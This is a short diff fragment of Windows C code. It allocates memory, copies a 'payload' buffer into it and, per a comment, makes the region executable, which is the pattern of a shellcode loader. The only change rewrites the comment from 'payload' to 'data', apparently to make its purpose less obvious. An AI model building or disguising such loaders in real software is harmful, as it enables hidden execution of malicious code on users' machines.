@@ -84,7 +84,7 @@ int bar(int x) {
 	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 
-	// Copy payload to newly allocated memory
+	// Copy data to newly allocated memory
 	RtlMoveMemory(exec_mem, payload, payload_len);
 
 	// Change memory region permission to RWX
